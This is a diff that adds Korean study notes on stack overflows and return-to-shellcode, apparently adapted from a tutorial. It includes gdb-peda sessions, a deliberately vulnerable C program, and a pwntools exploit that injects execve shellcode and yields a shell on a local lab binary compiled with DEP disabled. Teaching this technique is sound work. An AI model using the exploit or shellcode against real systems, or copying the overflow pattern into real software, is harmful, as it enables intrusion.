@@ -143,3 +143,125 @@ shellcode의 내용이 code에 복사되지 않아 발생한 문제이므로 she
   - 64 bit, 32bit, 16 bit 레지스터에 표현 가능한 값보다 작은 값을 저장하게 되면 나머지 공간은 null byte로 채워지게 됨.
   - shellcode는 shellcode가 실행되기 이전의 레지스터 값들을 그대로 사용하므로 사용 전에 레지스터의 모든 영역을 0으로 변경하는게 좋음.
     --> sub 명령어로 자기 자신의 레지스터 값을 빼거나 xor 명령어를 수행   
+
+<return to shellcode> : return address 영역을 shellcode가 저장된 주소로 변경하여 shellcode를 호출하는 방식
+
+--- CALL & RET instruction ---
+ - call 명령어는 return address를 stack에 저장한 후 피연산자 주소로 이동함
+ - ret 명령어는 pop명령어를 이용해 rsp 레지스터가 가리키는 stack 영역에 저장된 값을 rip(eip)에 저장한 후 해당 주소로 이동
+ 
+ ==> stack 영역에 저장된 return address값을 변경함으로서 프로그램의 흐름을 바꾸는 것이 가능함
+
+ - stack overwrite -
+Breakpoint 3, 0x00000000004004dc in vuln ()
+gdb-peda$ i r rsp
+rsp            0x7fffffffe488   0x7fffffffe488
+gdb-peda$ x/gx 0x7fffffffe488
+0x7fffffffe488: 0x00000000004004eb
+gdb-peda$ set *0x7fffffffe488 = 0x4004d6
+gdb-peda$ x/gx 0x7fffffffe488
+0x7fffffffe488: 0x00000000004004d6
+gdb-peda$ ni
+0x00000000004004d6 in vuln ()
+gdb-peda$ i r rip
+rip            0x4004d6 0x4004d6 <vuln>
+gdb-peda$
+
+ - return address(0x7fffffffe488) 영역에 저장되어 있던 값은 main+14(0x4004eb) 였으나 stack overflow에 의해 0x4004d6(vuln+0)로 변경됨.
+   --> return 명령어는 rsp 레지스터가 가리키는 주소 값인 0x4004d6 영역으로 이동한다.
+
+--- Permissions in memory ---
+프로그램에서 사용되는 메모리 영역은 모두 다음과 같은 권한들이 설정되어 있다.
+ - read(r) : 읽기
+ - write(w) : 값을 저장
+ - execute(x) : 코드 실행
+
+ - GCC(GNU Compiler Collection)는 기본적으로 	DEP(Data Execution Prevention)이 적용되므로 코드가 저장된 영역에서만 실행이 가능하고 데이터가 저장되는 영역에서는 실행권한이 설정되지 않는다.
+ - shellcode가 저장된 영역은 execute 권한이 설정되어 있어야 실행이 가능. --> DEP를 해제하기 위해 GCC옵션으로 "-z execstack"을 추가 --> 데이터 저장 영역에도 execute 권한 설정.
+
+--- 코드를 사용하여 return to shellcode 확인 ---
+
+#include <stdio.h>
+#include <unistd.h>
+ 
+void vuln(){
+    char buf[50];
+    printf("buf[50] address : %p\n",buf);
+    read(0, buf, 100);
+}
+ 
+void main(){
+    vuln();
+}
+
+ - main()함수는 vuln()함수를 호출, vuln()함수는 read()함수를 이용해 사용자로부터 100개의 문자를 입력받음
+   BUT 변수 buf의 크기가 50byte이기 때문에 stack overflow가 발생
+
+ **return address 확인**
+gdb-peda$ r
+Starting program: /home/lazenca0x0/Exploit/shellcode/poc
+ 
+Breakpoint 1, 0x0000000000400566 in vuln ()
+gdb-peda$ i r rsp
+rsp            0x7fffffffe448   0x7fffffffe448
+gdb-peda$ x/gx 0x7fffffffe448
+0x7fffffffe448: 0x00000000004005ab
+gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x000000000040059d <+0>:   push   rbp
+   0x000000000040059e <+1>:   mov    rbp,rsp
+   0x00000000004005a1 <+4>:   mov    eax,0x0
+   0x00000000004005a6 <+9>:   call   0x400566 <vuln>
+   0x00000000004005ab <+14>:  nop
+   0x00000000004005ac <+15>:  pop    rbp
+   0x00000000004005ad <+16>:  ret   
+End of assembler dump.
+gdb-peda$
+
+ - rsp 레지스터가 가리키고 있는 최상위 stack의 메모리는 0x7fffffffe448이고, 해당 메모리에 vuln() 함수 종료 후 돌아갈 코드영역의 주소 값(0x4005ab)이 저장되어 있음
+ 
+ ** burf 변수 주소 확인 **
+gdb-peda$ c
+Continuing.
+buf[50] address : 0x7fffffffe400
+ 
+Breakpoint 2, 0x0000000000400595 in vuln ()
+gdb-peda$ i r rsi
+rsi            0x7fffffffe400   0x7fffffffe400
+gdb-peda$ p/d 0x7fffffffe448 - 0x7fffffffe400
+$1 = 72
+gdb-peda$ ni
+AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK
+gdb-peda$ x/10gx 0x7fffffffe400
+0x7fffffffe400: 0x4141414141414141  0x4242424242424242
+0x7fffffffe410: 0x4343434343434343  0x4444444444444444
+0x7fffffffe420: 0x4545454545454545  0x4646464646464646
+0x7fffffffe430: 0x4747474747474747  0x4848484848484848
+0x7fffffffe440: 0x4949494949494949  0x4a4a4a4a4a4a4a4a
+gdb-peda$
+
+ - buf변수의 위치는 0x7fffffffe400 이며, Return address 위치와 72byte 떨어져 있음
+   ==> 사용자 입력 값으로 문자를 72개 이상 입력하면, Return address를 덮어쓸수 있음
+
+앞에서 확인한 내용을 바탕으로 아래와 같이 Exploit code를 작성 할 수 있음
+from pwn import *
+ 
+p = process('./poc')
+p.recvuntil('buf[50] address : ')
+stackAddr = p.recvuntil('\n')
+stackAddr = int(stackAddr,16)
+ 
+exploit = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+exploit += "\x90" * (72 - len(exploit))
+exploit += p64(stackAddr)
+p.send(exploit)
+p.interactive()
+
+해당 Exploit code를 실행하여 shell을 획득
+python exploit.py
+lazenca0x0@ubuntu:~/Exploit/shellcode$ python exploit.py
+[+] Starting local process './test': pid 111702
+[*] Switching to interactive mode
+$ id
+uid=1000(lazenca0x0) gid=1000(lazenca0x0) groups=1000(lazenca0x0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$
